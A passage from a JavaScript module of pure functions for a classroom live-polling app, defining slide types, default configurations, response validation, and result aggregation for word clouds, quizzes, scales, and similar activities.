/**
 * SurveyAll — pure logic.
 *
 * Everything in this file is a pure function: no DOM, no network, no
 * backend of any kind. That is deliberate. This is the code that decides
 * whether a student's answer is accepted, how results are counted, how a
 * quiz is scored, and what lands in the CSV — so it is the code that has
 * to be testable without a browser or a database. See tests/run-tests.mjs.
 *
 * It is also why swapping the backend touched nothing here.
 *
 * FERPA: nothing here ever receives or returns a student identifier.
 * The only per-respondent token is the session-scoped pseudonym.
 */

export const QUESTION_TYPES = [
  'instructions',
  'multiple_choice', 'word_cloud', 'open_ended',
  'scales', 'ranking', 'quiz', 'qa',
  'spectrum', 'sample_vote', 'heatmap',
  // The quick reads: one tap, answered without thinking about the tool.
  'traffic', 'mood', 'this_or_that',
  // Trade-offs and estimates: a number, but never a number to average.
  'budget', 'probability',
  // Checkable: there is a key, and the useful signal is where they missed.
  'cloze', 'matching', 'timeline',
  // The closer.
  'exit_ticket',
];

/** Types where one device may submit many rows (each gets its own slot). */
export const MULTI_SUBMIT_TYPES = new Set(['word_cloud', 'open_ended']);

/**
 * Slides that never collect an answer.
 *
 * A deck is a sequence of slides, and not every slide is a question — the
 * instructions slide that opens a class exists to get sixty phones into
 * the room, and it has no payload, no aggregate, no CSV column. Everything
 * that walks the deck expecting responses checks this set first.
 */
export const CONTENT_TYPES = new Set(['instructions']);

export function isContentSlide(type) { return CONTENT_TYPES.has(type); }

/** Human labels, used in the editor and in CSV headers. */
export const TYPE_LABELS = {
  instructions: 'Instructions',
  multiple_choice: 'Multiple choice',
  word_cloud: 'Word cloud',
  open_ended: 'Open ended',
  scales: 'Scales',
  ranking: 'Ranking',
  quiz: 'Quiz',
  qa: 'Q&A',
  spectrum: 'Opinion spectrum',
  sample_vote: 'Writing showdown',
  heatmap: 'Passage heatmap',
  traffic: 'Traffic light',
  mood: 'Mood check',
  this_or_that: 'This or That',
  budget: 'Budget split',
  probability: 'Probability slider',
  cloze: 'Fill in the blank',
  matching: 'Matching pairs',
  timeline: 'Timeline order',
  exit_ticket: 'Exit ticket',
};

/**
 * A one-line "what is this for", shown beside the type in the picker.
 * Written as the teaching move, not the data structure — the instructor
 * is choosing a thing to do to the room, not a chart.
 */
export const TYPE_BLURBS = {
  instructions: 'How to join. Shows the QR and the code.',
  multiple_choice: 'One question, a few options, the split on screen.',
  word_cloud: 'Everyone types a word; repeats grow.',
  open_ended: 'Sentences back, on cards.',
  scales: 'Rate several statements on one scale.',
  ranking: 'Drag a list into order.',
  quiz: 'Right answer, a clock, points.',
  qa: 'The room asks; you choose what to show.',
  spectrum: 'Place yourself between two poles.',
  sample_vote: 'Two samples side by side. Which works, and why?',
  heatmap: 'Tap the sentence that does the work.',
  traffic: 'Green, yellow, red. Am I going too fast?',
  mood: 'One icon each. How the room walked in.',
  this_or_that: 'A stack of either/ors, answered on instinct.',
  budget: 'A hundred points to spend. Trade-offs, not preferences.',
  probability: 'How likely is it? Everyone commits to a number.',
  cloze: 'A sentence with the load-bearing words taken out.',
  matching: 'Match each one to its partner.',
  timeline: 'Put them in the order they actually happened.',
  exit_ticket: 'Learned it, still wondering, muddiest point.',
};

/** The config a brand-new slide of each type starts life with. */
export function defaultConfig(type) {
  switch (type) {
    case 'instructions': return { steps: [...DEFAULT_JOIN_STEPS], show_join: true };
    case 'multiple_choice': return { options: ['', ''], multiple: false, chart: 'bars' };
    case 'quiz': return { options: ['', '', '', ''], correct: [0], time: 20, scoring: 'time', chart: 'bars' };
    case 'word_cloud': return { max_words: 1, max_length: 25 };
    case 'open_ended': return { max_length: 200 };
    case 'scales': return { statements: [''], min: 1, max: 5, allow_skip: false };
    case 'ranking': return { items: ['', ''] };
    case 'sample_vote': return { samples: ['', ''], allow_rationale: true };
    case 'heatmap': return { passage: '', segments: [], mode: 'highlight', max_picks: 1 };
    case 'traffic': return { labels: [...DEFAULT_TRAFFIC] };
    case 'mood': return { icons: DEFAULT_MOODS.map((m) => ({ ...m })) };
    case 'this_or_that': return { pairs: [{ left: '', right: '' }], allow_skip: false };
    case 'budget': return { options: ['', ''], total: 100 };
    case 'probability': return { truth: null };
    case 'cloze': return { text: '', case_sensitive: false };
    case 'matching': return { pairs: [{ left: '', right: '' }, { left: '', right: '' }] };
    case 'timeline': return { items: ['', ''] };
    case 'exit_ticket': return { prompts: [...DEFAULT_EXIT_PROMPTS], max_length: 200 };
    default: return {};
  }
}

/**
 * Traffic light's three states, in the order a room reads them: fine,
 * wobbling, lost. Editable, because "I'm with you" is a different
 * sentence in a lab than in a seminar — but three of them, always: a
 * fourth state is a multiple choice question wearing a costume.
 */
export const DEFAULT_TRAFFIC = ['I\'m with you', 'Losing the thread', 'Lost'];

/**
 * Mood check's default faces.
 *
 * Weather rather than emoji faces: a room will report "foggy" about
 * itself long before it will report "sad", and the metaphor gives the
 * instructor something to say back that isn't about the student.
 */
export const DEFAULT_MOODS = [
  { emoji: '☀️', label: 'Clear' },
  { emoji: '⛅', label: 'Alright' },
  { emoji: '🌫️', label: 'Foggy' },
  { emoji: '🌧️', label: 'Rough' },
  { emoji: '⚡', label: 'Wired' },
];

/** The exit ticket's three questions — the classic, pre-written. */
export const DEFAULT_EXIT_PROMPTS = [
  'One thing you learned',
  'A question you still have',
  'The muddiest point',
];

/**
 * The one list a type is built around, if it has one. Retyping between
 * two list-shaped types is the common move — four options become four
 * things to rank — so the writing survives it.
 */
const LIST_FIELD = {
  multiple_choice: 'options',
  quiz: 'options',
  ranking: 'items',
  scales: 'statements',
  sample_vote: 'samples',
  traffic: 'labels',
  budget: 'options',
  timeline: 'items',
  exit_ticket: 'prompts',
};

/** What each type keeps besides its list, for carrying across a retype. */
const CARRIES = {
  multiple_choice: ['multiple', 'max_choices', 'confidence', 'chart', 'mode', 'correct'],
  quiz: ['time', 'scoring', 'confidence', 'chart', 'correct'],
  word_cloud: ['max_words', 'max_length', 'hold'],
  open_ended: ['max_length', 'hold'],
  scales: ['min', 'max', 'allow_skip'],
  ranking: ['allow_partial'],
  spectrum: ['left_label', 'right_label', 'corners', 'confidence'],
  sample_vote: ['allow_rationale', 'confidence'],
  heatmap: ['mode', 'labels', 'max_picks'],
  instructions: ['show_join', 'note'],
  qa: [],
  traffic: [],
  mood: ['icons'],
  this_or_that: ['pairs', 'allow_skip'],
  budget: ['total', 'confidence'],
  probability: ['truth', 'confidence'],
  cloze: ['text', 'case_sensitive'],
  matching: ['pairs', 'allow_partial'],
  timeline: ['allow_partial'],
  exit_ticket: ['max_length'],
};

/** Human name for what a type's list holds, for the "this will be lost" line. */
const LIST_NOUN = {
  multiple_choice: 'answer options',
  quiz: 'answer options',
  ranking: 'items to rank',
  scales: 'statements',
  sample_vote: 'samples',
  instructions: 'join steps',
  heatmap: 'the passage',
  traffic: 'the three states',
  budget: 'the things to fund',
  timeline: 'the events',
  exit_ticket: 'the three prompts',
  this_or_that: 'the pairs',
  matching: 'the pairs',
  mood: 'the icons',
  cloze: 'the sentence',
};

/**
 * Change a slide's type, keeping everything the new type can still use.
 *
 * Retyping is genuinely lossy — a passage cannot become four options —
 * so this returns what it had to drop alongside the new config, and the
 * editor puts that list in front of the instructor before committing.
 * Silently discarding a paragraph somebody typed is not a thing to do.
 *
 * `mode` is deliberately NOT carried between multiple_choice and heatmap
 * even though both use the key: 'opinion'/'best' and
 * 'highlight'/'classify' are different vocabularies that happen to share
 * a name, and carrying one into the other produces a slide in a state
 * neither type has a UI for.
 *
 * @returns {{config: object, dropped: string[]}}
 */
export function retypeQuestion(from, to, config = {}) {
  if (from === to) return { config, dropped: [] };

  const next = defaultConfig(to);
  const dropped = [];
  const cfg = config || {};

  const fromList = LIST_FIELD[from];
  const toList = LIST_FIELD[to];
  const list = fromList && Array.isArray(cfg[fromList])
    ? cfg[fromList].filter((v) => String(typeof v === 'string' ? v : v?.label ?? '').trim())
    : [];

  if (list.length && toList) next[toList] = [...cfg[fromList]];
  else if (list.length) dropped.push(LIST_NOUN[from] || 'the list');

  // things that only exist on the old type
  if (from === 'instructions' && to !== 'instructions'
      && Array.isArray(cfg.steps) && cfg.steps.some((s) => String(s).trim())) {
    dropped.push(LIST_NOUN.instructions);
  }
  if (from === 'heatmap' && to !== 'heatmap' && String(cfg.passage || '').trim()) {
    dropped.push(LIST_NOUN.heatmap);
  }
  if (from === 'cloze' && to !== 'cloze' && String(cfg.text || '').trim()) {
    dropped.push(LIST_NOUN.cloze);
  }
  // Pairs survive between the two types built on them and nowhere else.
  if (PAIR_TYPES.has(from) && !PAIR_TYPES.has(to) && pairList(cfg).length) {
    dropped.push(LIST_NOUN[from]);
  }
  if (from === 'mood' && to !== 'mood' && Array.isArray(cfg.icons) && cfg.icons.length) {
    dropped.push(LIST_NOUN.mood);
  }

  const keep = new Set(CARRIES[to] || []);
  for (const key of CARRIES[from] || []) {
    if (cfg[key] === undefined || !keep.has(key)) continue;
    if (key === 'mode' && !sameModeVocabulary(from, to)) continue;
    next[key] = cfg[key];
  }

  // A quiz becoming a poll still has a right answer in it. Multiple
  // choice has somewhere to put one — "best answer" mode — so land there
  // rather than throwing away a key the instructor sat and marked.
  if (from === 'quiz' && to === 'multiple_choice' && hasKey(cfg.correct)) {
    next.mode = 'best';
    next.correct = cfg.correct;
  }

  // Everywhere else a key only means something if the room is shown one.
  if (next.correct !== undefined && to !== 'quiz' && next.mode !== 'best') delete next.correct;

  return { config: next, dropped };
}

function hasKey(correct) {
  return Array.isArray(correct) ? correct.length > 0 : typeof correct === 'number';
}

/** multiple_choice and quiz share opinion/best; heatmap's mode is its own. */
function sameModeVocabulary(a, b) {
  const choiceish = (t) => t === 'multiple_choice' || t === 'quiz';
  return (choiceish(a) && choiceish(b)) || (a === b);
}

/**
 * The steps an instructions slide shows when the instructor hasn't written
 * their own.
 *
 * They deliberately don't spell the code out: the slide already prints it
 * the size of a fist next to a scannable QR, and a step that repeats it is
 * a second place to read the same six characters from. Anyone who does
 * want it inline can write %CODE% in a step — see fillJoinPlaceholders —
 * and it renders as the deck's real code everywhere, editor included.
 */
export const DEFAULT_JOIN_STEPS = [
  'Open the camera on your phone and point it at the QR code.',
  'Or go to the address on screen and type in the code.',
  'Leave the page open, and questions appear as we go.',
];

/**
 * Deck-wide slide settings, kept here so the editor's preview and the
 * projector can never drift apart on what a deck is supposed to look like.
 */
export const PROMPT_SCALES = {
  compact: { name: 'Compact', scale: 0.68 },
  small: { name: 'Small', scale: 0.82 },
  medium: { name: 'Medium', scale: 1 },
  large: { name: 'Large', scale: 1.18 },
};

export const DEFAULT_PROMPT_SCALE = 'medium';

/** The multiplier for a deck's chosen question size. */
export function promptScale(deck) {
  const key = deck?.settings?.promptScale;
  return (PROMPT_SCALES[key] || PROMPT_SCALES[DEFAULT_PROMPT_SCALE]).scale;
}

/**
 * Whether to print "Word cloud · Question 1 of 8" above the question.
 *
 * On by default because it orients a room that just walked in, and off by
 * one click because plenty of instructors regard it as clutter on a slide
 * they are about to talk over. Absent means on — existing decks keep the
 * look they already had.
 */
export function showSlideLabel(deck) {
  return deck?.settings?.showSlideLabel !== false;
}

/** Fill %CODE% / %URL% placeholders in an instructions step. */
export function fillJoinPlaceholders(text, { code = '', url = '' } = {}) {
  return String(text || '')
    .replace(/%CODE%/gi, code)
    .replace(/%URL%/gi, url);
}

/**
 * Multiple-choice discussion modes (pedagogy roadmap, feature 1).
 * 'correct' — quiz semantics; 'best' — several defensible options, one or
 * more marked most defensible (humanities Peer Instruction; the reveal is
 * a quiet ring, not a green verdict); 'opinion' — no key at all, the
 * distribution is the discussion object.
 */
export const CHOICE_MODES = { correct: 'Has a right answer', best: 'Best answer', opinion: 'Opinion' };

// =====================================================================
// Normalisation helpers
// =====================================================================

/**
 * Word-cloud normalisation. Mentimeter lowercases everything to stop
 * "Zombie" and "zombie" showing as two words; we do that and also trim
 * edge punctuation, which is the other half of the same complaint
 * (their users have a 121-vote request to merge variants after the fact).
 */
export function normaliseWord(raw) {
  if (typeof raw !== 'string') return '';
  return raw
    .normalize('NFKC')
    .replace(/[‘’]/g, "'")
    .trim()
    .replace(/^[^\p{L}\p{N}'#@]+/u, '')
    .replace(/[^\p{L}\p{N}'#@]+$/u, '')
    .replace(/\s+/g, ' ')
    .toLocaleLowerCase();
}

export function cleanText(raw, max = 200) {
  if (typeof raw !== 'string') return '';
  return raw.replace(/\s+/g, ' ').trim().slice(0, max);
}

/**
 * Split a heatmap passage into tappable segments. A '|' anywhere is a
 * manual split and wins outright (the editor previews the split, and the
 * instructor can always override the guesser); otherwise a conservative
 * sentence split on ./!/? runs, keeping trailing quotes and brackets with
 * their sentence.
 */
export function splitPassage(text) {
  const t = String(text || '').replace(/\s+/g, ' ').trim();
  if (!t) return [];
  if (t.includes('|')) return t.split('|').map((s) => s.trim()).filter(Boolean);
  const parts = t.match(/[^.!?]+[.!?]+["'”’)\]]*|[^.!?]+$/g) || [t];
  return parts.map((s) => s.trim()).filter(Boolean);
}

/** Options may be plain strings or {label, correct} objects. */
export function optionLabel(opt) {
  if (opt == null) return '';
  if (typeof opt === 'string') return opt;
  return String(opt.label ?? '');
}

export function optionLabels(config) {
  const opts = Array.isArray(config?.options) ? config.options : [];
  return opts.map(optionLabel);
}

// =====================================================================
// Shapes the newer types are built on
//
// Each of these reads a config defensively and returns the canonical
// shape, so a half-written slide in the editor renders instead of
// throwing, and so the phone, the projector and the CSV can never
// disagree about how many blanks or pairs a question has.
// =====================================================================

/** The two types whose content is a list of {left, right} pairs. */
export const PAIR_TYPES = new Set(['this_or_that', 'matching']);

export function pairList(config) {
  const raw = Array.isArray(config?.pairs) ? config.pairs : [];
  return raw
    .map((p) => ({
      left: String(typeof p === 'string' ? p : p?.left ?? '').trim(),
      right: String(typeof p === 'string' ? '' : p?.right ?? '').trim(),
    }))
    .filter((p) => p.left || p.right);
}

export function trafficLabels(config) {
  const raw = Array.isArray(config?.labels) ? config.labels : [];
  return DEFAULT_TRAFFIC.map((dflt, i) => String(raw[i] ?? '').trim() || dflt);
}

export function moodIcons(config) {
  const raw = Array.isArray(config?.icons) ? config.icons : [];
  const list = raw
    .map((m) => ({
      emoji: String(typeof m === 'string' ? m : m?.emoji ?? '').trim(),
      label: String(typeof m === 'string' ? '' : m?.label ?? '').trim(),
    }))
    .filter((m) => m.emoji);
  return list.length ? list : DEFAULT_MOODS.map((m) => ({ ...m }));
}

export function exitPrompts(config) {
  const raw = Array.isArray(config?.prompts) ? config.prompts : [];
  const list = raw.map((p) => String(optionLabel(p)).trim()).filter(Boolean);
  return list.length ? list : [...DEFAULT_EXIT_PROMPTS];
}

export function timelineItems(config) {
  const raw = Array.isArray(config?.items) ? config.items : [];
  return raw.map((it) => String(optionLabel(it)));
}

/** Budget's pot. Always a whole number of points, always at least 1. */
export function budgetTotal(config) {
  const n = Number(config?.total);
  return Number.isFinite(n) && n >= 1 ? Math.round(n) : 100;
}

/**
 * Split a fill-in-the-blank sentence into text and blanks.
 *
 * The answer key is written inline — "The [mitochondrion|mitochondria] is
 * the powerhouse" — rather than in a list beside the sentence. One string
 * to edit means the key cannot drift out of step with the blanks, which is
 * the failure mode of every cloze tool that keeps them apart. A pipe
 * separates answers that should all count.
 */
export function clozeParts(text) {
  const src = String(text || '');
  const out = [];
  const re = /\[([^\]]*)\]/g;
  let last = 0;
  let m = re.exec(src);
  while (m) {
    if (m.index > last) out.push({ kind: 'text', text: src.slice(last, m.index) });
    out.push({
      kind: 'blank',
      answers: m[1].split('|').map((s) => s.trim()).filter(Boolean),
    });
    last = m.index + m[0].length;
    m = re.exec(src);
  }
  if (last < src.length) out.push({ kind: 'text', text: src.slice(last) });
  return out;
}

export function clozeBlanks(config) {
  return clozeParts(config?.text).filter((p) => p.kind === 'blank');
}

/**
 * Does a typed answer match a blank's key?
 *
 * Case and surrounding punctuation are ignored by default, because a
 * student who typed "Mitochondria." knew the answer and marking them
 * wrong for a full stop teaches them about the software, not the subject.
 * An unkeyed blank is never wrong — some blanks exist to be discussed.
 */
export function clozeMatches(answers, given, caseSensitive = false) {
  const keys = (answers || []).filter(Boolean);
  if (!keys.length) return null;
  const norm = (s) => {
    const t = String(s || '').normalize('NFKC').replace(/\s+/g, ' ').trim()
      .replace(/^[^\p{L}\p{N}]+/u, '').replace(/[^\p{L}\p{N}]+$/u, '');
    return caseSensitive ? t : t.toLocaleLowerCase();
  };
  const g = norm(given);
  if (!g) return false;
  return keys.some((k) => norm(k) === g);
}

/** Indices of correct options — presenter side only, never sent to phones. */
export function correctIndices(config) {
  if (!config) return [];
  if (Array.isArray(config.correct)) return config.correct.slice();
  if (typeof config.correct === 'number') return [config.correct];
  const opts = Array.isArray(config.options) ? config.options : [];
  const flagged = [];
  opts.forEach((o, i) => { if (o && typeof o === 'object' && o.correct) flagged.push(i); });
  return flagged;
}

// =====================================================================
// Participant flow: validation
//
// This runs on the phone before submitting AND is re-checked server-side
// by the Worker, which independently verifies against the database that
// the session is live, still accepting, and on this question and round.
// The check here exists to give a good error message; the server's check
// is what actually enforces it. Never remove the server one.
// =====================================================================

/**
 * Optional anonymous riders any answer may carry (pedagogy roadmap
 * features 1 and 2): a 1–3 confidence self-report ("guessing / fairly
 * sure / certain") and a hand-raise ("I'd say more about mine aloud").
 * Both are content about the answer, never about the person.
 */
function withRiders(payload, raw) {
  const conf = Number(raw?.conf);
  if (conf === 1 || conf === 2 || conf === 3) payload.conf = conf;
  if (raw?.volunteer === true) payload.volunteer = true;
  return payload;
}

/**
 * @returns {{ok: true, payload: object} | {ok: false, error: string}}
 */
export function validateResponse(type, config, raw) {
  const cfg = config || {};

  switch (type) {
    case 'multiple_choice': {
      const labels = optionLabels(cfg);
      const chosen = Array.isArray(raw?.choices) ? raw.choices : [];
      const clean = [...new Set(chosen)]
        .filter((i) => Number.isInteger(i) && i >= 0 && i < labels.length)
        .sort((a, b) => a - b);
      if (clean.length === 0) return { ok: false, error: 'Pick an option first.' };
      const max = cfg.multiple ? (cfg.max_choices || labels.length) : 1;
      if (clean.length > max) {
        return { ok: false, error: `Pick at most ${max} option${max === 1 ? '' : 's'}.` };
      }
      return { ok: true, payload: withRiders({ choices: clean }, raw) };
    }

    case 'quiz': {
      const labels = optionLabels(cfg);
      const choice = raw?.choice;
      if (!Number.isInteger(choice) || choice < 0 || choice >= labels.length) {
        return { ok: false, error: 'Pick an answer first.' };
      }
      const ms = Number.isFinite(raw?.ms) && raw.ms >= 0 ? Math.round(raw.ms) : null;
      return { ok: true, payload: withRiders({ choice, ms }, raw) };
    }

    case 'spectrum': {
      const n = Number(raw?.pos);
      if (!Number.isFinite(n)) return { ok: false, error: 'Slide to where you stand first.' };
      const pos = Math.min(100, Math.max(0, Math.round(n)));
      return { ok: true, payload: withRiders({ pos }, raw) };
    }

    case 'sample_vote': {
      const samples = Array.isArray(cfg.samples) ? cfg.samples : [];
      const choice = raw?.choice;
      if (!Number.isInteger(choice) || choice < 0 || choice >= samples.length) {
        return { ok: false, error: 'Pick a sample first.' };
      }
      const payload = { choice };
      const rationale = cleanText(raw?.rationale, 140);
      if (rationale) payload.rationale = rationale;
      return { ok: true, payload: withRiders(payload, raw) };
    }

    case 'heatmap': {
      const segs = Array.isArray(cfg.segments) ? cfg.segments : [];
      if (!segs.length) return { ok: false, error: 'This question has no passage yet.' };
      if (cfg.mode === 'classify') {
        const labels = Array.isArray(cfg.labels) ? cfg.labels : [];
        const rawTags = raw?.tags && typeof raw.tags === 'object' ? raw.tags : {};
        const tags = {};
        for (const [k, v] of Object.entries(rawTags)) {
          const si = Number(k);
          const li = Number(v);
          if (Number.isInteger(si) && si >= 0 && si < segs.length
              && Number.isInteger(li) && li >= 0 && li < labels.length) {
            tags[si] = li;
          }
        }
        if (!Object.keys(tags).length) return { ok: false, error: 'Tag at least one part.' };
        return { ok: true, payload: withRiders({ tags }, raw) };
      }
      const maxPicks = clampInt(cfg.max_picks, 1, 5, 1);
      const picks = [...new Set((Array.isArray(raw?.picks) ? raw.picks : [])
        .filter((i) => Number.isInteger(i) && i >= 0 && i < segs.length))]
        .sort((a, b) => a - b);
      if (!picks.length) return { ok: false, error: 'Tap a sentence first.' };
      if (picks.length > maxPicks) {
        return { ok: false, error: `Pick at most ${maxPicks} sentence${maxPicks === 1 ? '' : 's'}.` };
      }
      return { ok: true, payload: withRiders({ picks }, raw) };
    }

    case 'word_cloud': {
      const maxWords = clampInt(cfg.max_words, 1, 10, 1);
      const maxLen = clampInt(cfg.max_length, 1, 60, 25);
      const words = (Array.isArray(raw?.words) ? raw.words : [])
        .map((w) => normaliseWord(w).slice(0, maxLen))
        .filter(Boolean);
      const unique = [...new Set(words)];
      if (unique.length === 0) return { ok: false, error: 'Type at least one word.' };
      if (unique.length > maxWords) {
        return { ok: false, error: `Up to ${maxWords} word${maxWords === 1 ? '' : 's'}.` };
      }
      return { ok: true, payload: withRiders({ words: unique }, raw) };
    }

    case 'open_ended': {
      const limit = clampInt(cfg.max_length, 20, 1000, 200);
      const text = cleanText(raw?.text, limit);
      if (!text) return { ok: false, error: 'Write something first.' };
      return { ok: true, payload: withRiders({ text }, raw) };
    }

    case 'scales': {
      const statements = Array.isArray(cfg.statements) ? cfg.statements : [];
      const min = Number.isFinite(cfg.min) ? cfg.min : 1;
      const max = Number.isFinite(cfg.max) ? cfg.max : 5;
      const given = Array.isArray(raw?.values) ? raw.values : [];
      const values = statements.map((_, i) => {
        const v = given[i];
        if (v == null || v === '') return null;
        const n = Number(v);
        if (!Number.isFinite(n)) return null;
        return Math.min(max, Math.max(min, Math.round(n)));
      });
      const answered = values.filter((v) => v != null).length;
      if (answered === 0) return { ok: false, error: 'Rate at least one statement.' };
      if (!cfg.allow_skip && answered < statements.length) {
        return { ok: false, error: 'Rate every statement.' };
      }
      return { ok: true, payload: withRiders({ values }, raw) };
    }

    case 'ranking': {
      const items = Array.isArray(cfg.items) ? cfg.items : [];
      const order = Array.isArray(raw?.order) ? raw.order : [];
      const clean = [];
      for (const i of order) {
        if (Number.isInteger(i) && i >= 0 && i < items.length && !clean.includes(i)) clean.push(i);
      }
      if (clean.length === 0) return { ok: false, error: 'Put the items in order first.' };
      if (!cfg.allow_partial && clean.length !== items.length) {
        return { ok: false, error: 'Rank every item.' };
      }
      return { ok: true, payload: withRiders({ order: clean }, raw) };
    }

    case 'traffic': {
      const choice = raw?.choice;
      if (!Number.isInteger(choice) || choice < 0 || choice > 2) {
        return { ok: false, error: 'Pick one first.' };
      }
      return { ok: true, payload: withRiders({ choice }, raw) };
    }

    case 'mood': {
      const icons = moodIcons(cfg);
      const choice = raw?.choice;
      if (!Number.isInteger(choice) || choice < 0 || choice >= icons.length) {
        return { ok: false, error: 'Pick one first.' };
      }
      return { ok: true, payload: withRiders({ choice }, raw) };
    }

    case 'this_or_that': {
      const pairs = pairList(cfg);
      if (!pairs.length) return { ok: false, error: 'This question has no pairs yet.' };
      const given = Array.isArray(raw?.picks) ? raw.picks : [];
      const picks = pairs.map((_, i) => (given[i] === 0 || given[i] === 1 ? given[i] : null));
      const answered = picks.filter((p) => p != null).length;
      if (!answered) return { ok: false, error: 'Pick a side on at least one.' };
      if (!cfg.allow_skip && answered < pairs.length) {
        return { ok: false, error: 'Pick a side on every one.' };
      }
      return { ok: true, payload: withRiders({ picks }, raw) };
    }

    case 'budget': {
      const labels = optionLabels(cfg);
      if (!labels.length) return { ok: false, error: 'This question has nothing to fund yet.' };
      const total = budgetTotal(cfg);
      const given = Array.isArray(raw?.alloc) ? raw.alloc : [];
      const alloc = labels.map((_, i) => {
        const n = Number(given[i]);
        return Number.isFinite(n) && n > 0 ? Math.round(n) : 0;
      });
      const spent = alloc.reduce((s, n) => s + n, 0);
      if (spent === 0) return { ok: false, error: `Spend your ${total} points first.` };
      // Spending exactly the pot is the whole exercise: a half-spent budget
      // is a preference, and preferences are what the other types are for.
      if (spent !== total) {
        return {
          ok: false,
          error: spent > total
            ? `That's ${spent} of ${total}. Take ${spent - total} back.`
            : `That's ${spent} of ${total}, with ${total - spent} still to place.`,
        };
      }
      return { ok: true, payload: withRiders({ alloc }, raw) };
    }

    case 'probability': {
      const n = Number(raw?.pct);
      if (!Number.isFinite(n)) return { ok: false, error: 'Slide to your estimate first.' };
      const pct = Math.min(100, Math.max(0, Math.round(n)));
      return { ok: true, payload: withRiders({ pct }, raw) };
    }

    case 'cloze': {
      const blanks = clozeBlanks(cfg);
      if (!blanks.length) return { ok: false, error: 'This question has no blanks yet.' };
      const given = Array.isArray(raw?.blanks) ? raw.blanks : [];
      const filled = blanks.map((_, i) => cleanText(given[i], 40));
      if (!filled.some(Boolean)) return { ok: false, error: 'Fill in at least one blank.' };
      return { ok: true, payload: withRiders({ blanks: filled }, raw) };
    }

    case 'matching': {
      const pairs = pairList(cfg);
      if (!pairs.length) return { ok: false, error: 'This question has no pairs yet.' };
      const given = Array.isArray(raw?.matches) ? raw.matches : [];
      const matches = pairs.map((_, i) => {
        const v = given[i];
        return Number.isInteger(v) && v >= 0 && v < pairs.length ? v : null;
      });
      const answered = matches.filter((m) => m != null).length;
      if (!answered) return { ok: false, error: 'Match at least one.' };
      if (!cfg.allow_partial && answered < pairs.length) {
        return { ok: false, error: 'Match every one.' };
      }
      return { ok: true, payload: withRiders({ matches }, raw) };
    }

    case 'timeline': {
      const items = timelineItems(cfg);
      const order = Array.isArray(raw?.order) ? raw.order : [];
      const clean = [];
      for (const i of order) {
        if (Number.isInteger(i) && i >= 0 && i < items.length && !clean.includes(i)) clean.push(i);
      }
      if (!clean.length) return { ok: false, error: 'Put them in order first.' };
      if (!cfg.allow_partial && clean.length !== items.length) {
        return { ok: false, error: 'Place every one.' };
      }
      return { ok: true, payload: withRiders({ order: clean }, raw) };
    }

    case 'exit_ticket': {
      const prompts = exitPrompts(cfg);
      const limit = clampInt(cfg.max_length, 20, 1000, 200);
      const given = Array.isArray(raw?.answers) ? raw.answers : [];
      const answers = prompts.map((_, i) => cleanText(given[i], limit));
      // Any one of the three is a real answer — a student who has a
      // question but nothing else to report should still be able to send.
      if (!answers.some(Boolean)) return { ok: false, error: 'Answer at least one of them.' };
      return { ok: true, payload: withRiders({ answers }, raw) };
    }

    case 'qa':
      return { ok: false, error: 'Q&A is submitted separately.' };

    case 'instructions':
      return { ok: false, error: 'This slide has nothing to answer.' };

    default:
      return { ok: false, error: `Unknown question type: ${type}` };
  }
}

function clampInt(v, lo, hi, dflt) {
  const n = Number(v);
  if (!Number.isFinite(n)) return dflt;
  return Math.min(hi, Math.max(lo, Math.round(n)));
}

// =====================================================================
// Aggregation — turns raw payloads into what the projector draws
// =====================================================================

export function aggregate(type, config, rows) {
  const cfg = config || {};
  const payloads = (rows || []).map((r) => (r && r.payload ? r.payload : r)).filter(Boolean);

  switch (type) {
    case 'multiple_choice':
    case 'quiz': {
      const labels = optionLabels(cfg);
      const counts = new Array(labels.length).fill(0);
      let total = 0;
      for (const p of payloads) {
        const picks = type === 'quiz'
          ? (Number.isInteger(p.choice) ? [p.choice] : [])
          : (Array.isArray(p.choices) ? p.choices : []);
        let counted = false;
        for (const i of picks) {
          if (i >= 0 && i < counts.length) { counts[i] += 1; counted = true; }
        }
        if (counted) total += 1;
      }
      const options = labels.map((label, i) => ({
        label,
        count: counts[i],
        pct: total ? (counts[i] / total) * 100 : 0,
      }));
      const out = { type, total, options };
      if (type === 'quiz' || cfg.mode === 'best') out.correct = correctIndices(cfg);
      out.confidence = confidenceSplit(payloads, correctIndices(cfg), type);
      return out;
    }

    case 'word_cloud': {
      // Presenter curation (pedagogy roadmap, feature 8): merges fold
      // variants together ("arguing" → "argue"), hides drop a word from
      // display. Both are counted and returned so the projector can show
      // an honest "2 merged · 1 hidden" chip — curation is visible, never
      // silent.
      const merges = cfg.word_merges && typeof cfg.word_merges === 'object'
        ? cfg.word_merges : null;
      const hiddenSet = new Set(
        (Array.isArray(cfg.word_hidden) ? cfg.word_hidden : []).map(normaliseWord));
      const tally = new Map();
      const mergedFrom = new Set();
      let hiddenCount = 0;
      let total = 0;
      for (const p of payloads) {
        const words = Array.isArray(p.words) ? p.words : [];
        if (words.length) total += 1;
        for (const w of words) {
          let k = normaliseWord(w);
          if (!k) continue;
          if (merges && typeof merges[k] === 'string') {
            const to = normaliseWord(merges[k]);
            if (to && to !== k) { mergedFrom.add(k); k = to; }
          }
          if (hiddenSet.has(k)) { hiddenCount += 1; continue; }
          tally.set(k, (tally.get(k) || 0) + 1);
        }
      }
      const words = [...tally.entries()]
        .map(([word, count]) => ({ word, count }))
        .sort((a, b) => b.count - a.count || a.word.localeCompare(b.word))
        .slice(0, 400); // same display ceiling Mentimeter uses
      return {
        type, total, words, distinct: tally.size,
        merged: mergedFrom.size, hidden: hiddenCount,
      };
    }

    case 'open_ended': {
      const entries = payloads
        .map((p) => cleanText(p.text, 1000))
        .filter(Boolean)
        .map((text) => ({ text }));
      return { type, total: entries.length, entries };
    }

    case 'scales': {
      const statements = Array.isArray(cfg.statements) ? cfg.statements : [];
      const min = Number.isFinite(cfg.min) ? cfg.min : 1;
      const max = Number.isFinite(cfg.max) ? cfg.max : 5;
      const acc = statements.map(() => ({ sum: 0, count: 0, dist: new Map() }));
      let total = 0;
      for (const p of payloads) {
        const values = Array.isArray(p.values) ? p.values : [];
        let any = false;
        values.forEach((v, i) => {
          if (v == null || !acc[i]) return;
          const n = Number(v);
          if (!Number.isFinite(n)) return;
          acc[i].sum += n;
          acc[i].count += 1;
          acc[i].dist.set(n, (acc[i].dist.get(n) || 0) + 1);
          any = true;
        });
        if (any) total += 1;
      }
      return {
        type, total, min, max,
        statements: statements.map((label, i) => ({
          label: typeof label === 'string' ? label : String(label?.label ?? ''),
          // skipped statements are excluded from the average, matching
          // the behaviour instructors already expect from Mentimeter
          avg: acc[i].count ? acc[i].sum / acc[i].count : null,
          count: acc[i].count,
